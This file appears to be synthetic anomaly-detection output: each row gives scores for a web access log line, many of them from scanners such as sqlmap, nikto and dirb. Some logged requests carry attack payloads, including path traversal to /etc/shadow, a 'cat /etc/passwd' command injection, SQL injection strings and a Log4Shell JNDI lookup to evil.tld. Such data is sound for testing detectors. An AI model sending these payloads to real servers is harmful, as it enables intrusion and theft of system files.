score_content,score_session,score_fused,line
101.51648712158203,,101.51648712158203,35.52.170.211 - - [10/Jan/2025:12:00:36 +0000] "TRACE /.git/config HTTP/1.1" 200 5487 "https://news.ycombinator.com/" "nikto/2.5.0"
12.75553035736084,,12.75553035736084,225.121.69.206 - - [10/Jan/2025:12:00:39 +0000] "PUT /profile HTTP/1.1" 200 19783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
102.83727264404297,,102.83727264404297,181.179.42.39 - - [10/Jan/2025:12:00:42 +0000] "TRACE /contact HTTP/1.1" 200 4877 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6140987873077393,,1.6140987873077393,188.132.109.160 - - [10/Jan/2025:12:00:42 +0000] "GET /profile HTTP/1.1" 200 2182 "https://news.ycombinator.com/" "dirb/2.22"
73.81137084960938,,73.81137084960938,242.180.136.170 - - [10/Jan/2025:12:00:42 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 7216 "https://www.google.com/" "sqlmap/1.7.2#stable"
46.40471267700195,,46.40471267700195,235.12.66.108 - - [10/Jan/2025:12:00:42 +0000] "HEAD /dashboard HTTP/1.1" 200 9650 "https://example.com/" "sqlmap/1.7.2#stable"
107.13174438476562,,107.13174438476562,71.9.225.83 - - [10/Jan/2025:12:00:42 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 17682 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
78.01327514648438,,78.01327514648438,44.154.97.250 - - [10/Jan/2025:12:00:45 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 302 11379 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
33.057376861572266,,33.057376861572266,204.135.126.174 - - [10/Jan/2025:12:00:45 +0000] "DELETE /search?q=ssd HTTP/1.1" 301 6926 "https://twitter.com/" "dirb/2.22"
8.558879852294922,,8.558879852294922,46.20.67.85 - - [10/Jan/2025:12:00:48 +0000] "POST /search?q=router HTTP/1.1" 200 12838 "https://example.com/" "curl/7.85.0"
1.6893693208694458,,1.6893693208694458,34.90.174.106 - - [10/Jan/2025:12:00:50 +0000] "GET /login HTTP/1.1" 200 6204 "https://twitter.com/" "curl/7.85.0"
30.932558059692383,,30.932558059692383,172.112.142.5 - - [10/Jan/2025:12:00:50 +0000] "DELETE /search?q=monitor HTTP/1.1" 204 11488 "-" "python-requests/2.31.0"
32.973182678222656,,32.973182678222656,16.240.147.61 - - [10/Jan/2025:12:00:53 +0000] "DELETE /search?q=monitor HTTP/1.1" 302 3473 "https://www.google.com/" "curl/7.85.0"
11.452640533447266,,11.452640533447266,150.245.134.158 - - [10/Jan/2025:12:00:53 +0000] "GET /index.html HTTP/1.1" 401 93 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.294734477996826,,4.294734477996826,241.88.235.79 - - [10/Jan/2025:12:00:55 +0000] "POST /dashboard HTTP/1.1" 200 10064 "https://example.com/" "dirb/2.22"
107.00375366210938,,107.00375366210938,112.109.103.59 - - [10/Jan/2025:12:00:56 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 3403 "-" "curl/7.85.0"
16.93327522277832,,16.93327522277832,193.153.151.88 - - [10/Jan/2025:12:00:57 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8857 "https://news.ycombinator.com/" "nikto/2.5.0"
70.4112319946289,,70.4112319946289,8.164.74.146 - - [10/Jan/2025:12:00:58 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 14484 "https://twitter.com/" "dirb/2.22"
3.685436487197876,,3.685436487197876,130.159.68.149 - - [10/Jan/2025:12:01:01 +0000] "GET /profile HTTP/1.1" 302 7735 "https://example.com/" "nikto/2.5.0"
16.81038475036621,,16.81038475036621,81.173.119.104 - - [10/Jan/2025:12:01:04 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1493 "https://twitter.com/" "python-requests/2.31.0"
77.98470306396484,,77.98470306396484,123.219.188.244 - - [10/Jan/2025:12:01:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 301 6256 "https://example.com/" "python-requests/2.31.0"
107.11925506591797,,107.11925506591797,139.120.152.142 - - [10/Jan/2025:12:01:05 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 13104 "https://news.ycombinator.com/" "dirb/2.22"
573.5809936523438,,573.5809936523438,100.88.28.217 - - [10/Jan/2025:12:01:05 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 502 1262 "https://www.google.com/" "python-requests/2.31.0"
0.257274866104126,,0.257274866104126,217.85.28.128 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.js HTTP/1.1" 200 7290 "-" "python-requests/2.31.0"
4.335752964019775,,4.335752964019775,50.130.202.112 - - [10/Jan/2025:12:01:06 +0000] "POST /contact HTTP/1.1" 204 7662 "-" "dirb/2.22"
0.2681737244129181,,0.2681737244129181,187.3.92.144 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.css HTTP/1.1" 201 18763 "https://twitter.com/" "nikto/2.5.0"
47.092891693115234,,47.092891693115234,87.138.138.244 - - [10/Jan/2025:12:01:06 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 304 4457 "https://example.com/" "nikto/2.5.0"
26.742643356323242,,26.742643356323242,9.243.52.194 - - [10/Jan/2025:12:01:09 +0000] "DELETE /contact HTTP/1.1" 200 1444 "https://example.com/" "python-requests/2.31.0"
0.22996655106544495,,0.22996655106544495,25.136.36.93 - - [10/Jan/2025:12:01:09 +0000] "GET /assets/app.css HTTP/1.1" 200 5729 "-" "python-requests/2.31.0"
30.92284393310547,,30.92284393310547,111.178.229.50 - - [10/Jan/2025:12:01:10 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 903 "https://news.ycombinator.com/" "python-requests/2.31.0"
71.9167709350586,,71.9167709350586,223.254.135.66 - - [10/Jan/2025:12:01:12 +0000] "OPTIONS /login HTTP/1.1" 200 18396 "https://example.com/" "curl/7.85.0"
109.05130004882812,,109.05130004882812,34.111.191.72 - - [10/Jan/2025:12:01:14 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 15098 "https://twitter.com/" "nikto/2.5.0"
102.8818588256836,,102.8818588256836,157.81.125.193 - - [10/Jan/2025:12:01:15 +0000] "TRACE /profile HTTP/1.1" 200 19274 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
113.97467803955078,,113.97467803955078,220.205.69.97 - - [10/Jan/2025:12:01:16 +0000] "TRACE /logout HTTP/1.1" 403 346 "https://example.com/" "curl/7.85.0"
12.676538467407227,,12.676538467407227,116.224.60.221 - - [10/Jan/2025:12:01:17 +0000] "PUT /dashboard HTTP/1.1" 200 12291 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.65765380859375,,50.65765380859375,37.174.77.174 - - [10/Jan/2025:12:01:20 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 6819 "https://news.ycombinator.com/" "nikto/2.5.0"
71.84479522705078,,71.84479522705078,133.82.198.31 - - [10/Jan/2025:12:01:20 +0000] "OPTIONS /logout HTTP/1.1" 200 5747 "-" "sqlmap/1.7.2#stable"
76.07319641113281,,76.07319641113281,49.184.236.219 - - [10/Jan/2025:12:01:21 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16491 "https://example.com/" "python-requests/2.31.0"
3.054857015609741,,3.054857015609741,137.90.253.223 - - [10/Jan/2025:12:01:24 +0000] "POST /.git/config HTTP/1.1" 200 18954 "https://twitter.com/" "dirb/2.22"
102.79711151123047,,102.79711151123047,29.225.147.74 - - [10/Jan/2025:12:01:27 +0000] "TRACE /dashboard HTTP/1.1" 200 10110 "-" "dirb/2.22"
52.72319412231445,,52.72319412231445,191.33.122.78 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=phone HTTP/1.1" 302 7368 "https://twitter.com/" "dirb/2.22"
28.774011611938477,,28.774011611938477,89.121.163.18 - - [10/Jan/2025:12:01:30 +0000] "DELETE /dashboard HTTP/1.1" 302 12656 "https://example.com/" "nikto/2.5.0"
50.653316497802734,,50.653316497802734,107.227.234.28 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 14954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
109.0508041381836,,109.0508041381836,221.84.63.83 - - [10/Jan/2025:12:01:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 14920 "https://twitter.com/" "python-requests/2.31.0"
18.976150512695312,,18.976150512695312,1.34.25.91 - - [10/Jan/2025:12:01:30 +0000] "PUT /api/product?id=123 HTTP/1.1" 302 1142 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
23.766874313354492,,23.766874313354492,37.142.46.249 - - [10/Jan/2025:12:01:32 +0000] "PUT /login HTTP/1.1" 400 1115 "-" "python-requests/2.31.0"
50.69845962524414,,50.69845962524414,237.128.112.63 - - [10/Jan/2025:12:01:33 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 2944 "https://twitter.com/" "sqlmap/1.7.2#stable"
16.91260528564453,,16.91260528564453,186.226.47.60 - - [10/Jan/2025:12:01:36 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2563 "https://twitter.com/" "sqlmap/1.7.2#stable"
87.14122772216797,,87.14122772216797,254.41.82.225 - - [10/Jan/2025:12:01:36 +0000] "OPTIONS /search?q=phone HTTP/1.1" 403 267 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
113.78457641601562,,113.78457641601562,173.99.29.63 - - [10/Jan/2025:12:01:37 +0000] "TRACE /api/products HTTP/1.1" 401 1388 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
6.457296371459961,,6.457296371459961,84.208.23.221 - - [10/Jan/2025:12:01:39 +0000] "POST /logout HTTP/1.1" 302 15714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
639.8302001953125,,639.8302001953125,131.197.29.254 - - [10/Jan/2025:12:01:42 +0000] "OPTIONS /about HTTP/1.1" 500 52 "https://www.google.com/" "sqlmap/1.7.2#stable"
76.08856964111328,,76.08856964111328,56.212.81.60 - - [10/Jan/2025:12:01:45 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 189 "https://twitter.com/" "sqlmap/1.7.2#stable"
107.0408706665039,,107.0408706665039,77.218.213.222 - - [10/Jan/2025:12:01:45 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 4976 "https://news.ycombinator.com/" "curl/7.85.0"
12.68399429321289,,12.68399429321289,221.201.234.229 - - [10/Jan/2025:12:01:47 +0000] "GET /profile HTTP/1.1" 400 183 "https://www.google.com/" "curl/7.85.0"
0.3238140046596527,,0.3238140046596527,182.67.210.141 - - [10/Jan/2025:12:01:47 +0000] "GET /index.html HTTP/1.1" 200 5461 "https://www.google.com/" "curl/7.85.0"
12.653288841247559,,12.653288841247559,81.124.182.242 - - [10/Jan/2025:12:01:49 +0000] "PUT /api/products HTTP/1.1" 200 8966 "-" "nikto/2.5.0"
71.76839447021484,,71.76839447021484,168.20.19.73 - - [10/Jan/2025:12:01:52 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9550 "https://example.com/" "nikto/2.5.0"
10.616333961486816,,10.616333961486816,52.171.215.10 - - [10/Jan/2025:12:01:54 +0000] "POST /search?q=laptop HTTP/1.1" 304 6329 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.5169563293457,,46.5169563293457,114.142.235.126 - - [10/Jan/2025:12:01:56 +0000] "HEAD /login HTTP/1.1" 200 6725 "-" "curl/7.85.0"
25.672632217407227,,25.672632217407227,104.19.206.95 - - [10/Jan/2025:12:01:57 +0000] "DELETE /.env HTTP/1.1" 200 17568 "-" "python-requests/2.31.0"
5.807980537414551,,5.807980537414551,168.110.83.167 - - [10/Jan/2025:12:02:00 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7518 "https://example.com/" "python-requests/2.31.0"
5.856119155883789,,5.856119155883789,194.152.37.83 - - [10/Jan/2025:12:02:02 +0000] "GET /search?q=camera HTTP/1.1" 200 16915 "https://twitter.com/" "nikto/2.5.0"
13.453452110290527,,13.453452110290527,9.45.189.230 - - [10/Jan/2025:12:02:03 +0000] "PUT /wp-login.php HTTP/1.1" 301 19361 "https://news.ycombinator.com/" "dirb/2.22"
5.831441879272461,,5.831441879272461,244.193.111.240 - - [10/Jan/2025:12:02:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 14815 "https://twitter.com/" "dirb/2.22"
0.27093908190727234,,0.27093908190727234,154.233.37.95 - - [10/Jan/2025:12:02:07 +0000] "GET /assets/app.js HTTP/1.1" 200 11289 "https://www.google.com/" "python-requests/2.31.0"
73.81047821044922,,73.81047821044922,240.118.111.197 - - [10/Jan/2025:12:02:09 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 17902 "https://twitter.com/" "sqlmap/1.7.2#stable"
45.03113555908203,,45.03113555908203,55.201.221.93 - - [10/Jan/2025:12:02:10 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 9260 "https://www.google.com/" "dirb/2.22"
106.91653442382812,,106.91653442382812,182.212.114.163 - - [10/Jan/2025:12:02:13 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6958 "https://news.ycombinator.com/" "dirb/2.22"
1.90070378780365,,1.90070378780365,238.198.70.167 - - [10/Jan/2025:12:02:13 +0000] "GET / HTTP/1.1" 200 14459 "https://www.google.com/" "dirb/2.22"
50.67827224731445,,50.67827224731445,169.218.186.149 - - [10/Jan/2025:12:02:15 +0000] "HEAD /search?q=router HTTP/1.1" 200 17171 "https://example.com/" "sqlmap/1.7.2#stable"
614.5171508789062,,614.5171508789062,153.167.69.247 - - [10/Jan/2025:12:02:17 +0000] "HEAD /profile HTTP/1.1" 503 53 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.254168301820755,,0.254168301820755,38.36.142.18 - - [10/Jan/2025:12:02:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12845 "-" "Wget/1.21.2 (linux-gnu)"
50.66289138793945,,50.66289138793945,251.44.246.154 - - [10/Jan/2025:12:02:20 +0000] "HEAD /search?q=router HTTP/1.1" 200 11820 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
48.523338317871094,,48.523338317871094,91.246.58.18 - - [10/Jan/2025:12:02:20 +0000] "HEAD /profile HTTP/1.1" 304 1356 "https://example.com/" "curl/7.85.0"
50.56101989746094,,50.56101989746094,152.252.137.21 - - [10/Jan/2025:12:02:22 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3070 "-" "nikto/2.5.0"
639.69189453125,,639.69189453125,11.132.174.100 - - [10/Jan/2025:12:02:23 +0000] "OPTIONS /contact HTTP/1.1" 502 807 "https://news.ycombinator.com/" "curl/7.85.0"
0.23474346101284027,,0.23474346101284027,61.91.41.56 - - [10/Jan/2025:12:02:23 +0000] "GET /assets/app.js HTTP/1.1" 204 1559 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
19.022239685058594,,19.022239685058594,163.106.69.143 - - [10/Jan/2025:12:02:25 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 5364 "-" "nikto/2.5.0"
4.98134183883667,,4.98134183883667,150.89.83.93 - - [10/Jan/2025:12:02:28 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 4775 "https://example.com/" "sqlmap/1.7.2#stable"
26.78376579284668,,26.78376579284668,22.110.83.149 - - [10/Jan/2025:12:02:28 +0000] "DELETE /logout HTTP/1.1" 200 6717 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.766847610473633,,26.766847610473633,45.104.57.241 - - [10/Jan/2025:12:02:29 +0000] "DELETE /contact HTTP/1.1" 200 10948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.5404057502746582,,1.5404057502746582,195.12.2.254 - - [10/Jan/2025:12:02:32 +0000] "GET /phpmyadmin HTTP/1.1" 200 6372 "https://twitter.com/" "curl/7.85.0"
16.911046981811523,,16.911046981811523,38.48.36.5 - - [10/Jan/2025:12:02:34 +0000] "PUT /search?q=router HTTP/1.1" 200 6496 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
32.986873626708984,,32.986873626708984,232.63.41.108 - - [10/Jan/2025:12:02:35 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 7613 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
8.449169158935547,,8.449169158935547,148.197.254.196 - - [10/Jan/2025:12:02:38 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 316 "https://example.com/" "dirb/2.22"
10.624347686767578,,10.624347686767578,108.134.108.209 - - [10/Jan/2025:12:02:39 +0000] "POST /search?q=laptop HTTP/1.1" 301 19961 "-" "dirb/2.22"
12.729934692382812,,12.729934692382812,190.193.225.124 - - [10/Jan/2025:12:02:39 +0000] "PUT /logout HTTP/1.1" 204 4280 "https://example.com/" "dirb/2.22"
1.6274539232254028,,1.6274539232254028,25.201.190.251 - - [10/Jan/2025:12:02:41 +0000] "GET /contact HTTP/1.1" 200 6766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
48.35005187988281,,48.35005187988281,178.191.25.7 - - [10/Jan/2025:12:02:43 +0000] "HEAD /server-status HTTP/1.1" 302 6399 "https://www.google.com/" "dirb/2.22"
1.482016682624817,,1.482016682624817,89.67.167.165 - - [10/Jan/2025:12:02:45 +0000] "GET /server-status HTTP/1.1" 200 493 "https://twitter.com/" "nikto/2.5.0"
0.2529349625110626,,0.2529349625110626,11.19.113.41 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 12443 "https://example.com/" "python-requests/2.31.0"
46.464698791503906,,46.464698791503906,43.67.244.138 - - [10/Jan/2025:12:02:48 +0000] "HEAD /contact HTTP/1.1" 200 10107 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.8766028881072998,,1.8766028881072998,149.55.232.84 - - [10/Jan/2025:12:02:51 +0000] "GET / HTTP/1.1" 204 9680 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.840977191925049,,5.840977191925049,73.91.116.125 - - [10/Jan/2025:12:02:53 +0000] "GET /search?q=router HTTP/1.1" 200 11709 "https://twitter.com/" "sqlmap/1.7.2#stable"
46.55190658569336,,46.55190658569336,239.162.59.186 - - [10/Jan/2025:12:02:55 +0000] "HEAD /login HTTP/1.1" 200 18069 "-" "curl/7.85.0"
50.671085357666016,,50.671085357666016,243.186.125.161 - - [10/Jan/2025:12:02:55 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10737 "https://twitter.com/" "nikto/2.5.0"
71.9149398803711,,71.9149398803711,191.111.239.212 - - [10/Jan/2025:12:02:58 +0000] "OPTIONS /login HTTP/1.1" 200 17686 "https://twitter.com/" "nikto/2.5.0"
45.12654113769531,,45.12654113769531,181.36.177.246 - - [10/Jan/2025:12:03:00 +0000] "HEAD /wp-login.php HTTP/1.1" 200 12869 "https://twitter.com/" "nikto/2.5.0"
2.2943930625915527,,2.2943930625915527,196.177.144.207 - - [10/Jan/2025:12:03:00 +0000] "GET /assets/app.css HTTP/1.1" 302 8221 "https://twitter.com/" "dirb/2.22"
10.64767837524414,,10.64767837524414,40.125.19.98 - - [10/Jan/2025:12:03:01 +0000] "POST /api/product?id=123 HTTP/1.1" 304 11487 "https://www.google.com/" "dirb/2.22"
4.397218704223633,,4.397218704223633,243.43.248.151 - - [10/Jan/2025:12:03:01 +0000] "POST /logout HTTP/1.1" 200 14166 "https://example.com/" "python-requests/2.31.0"
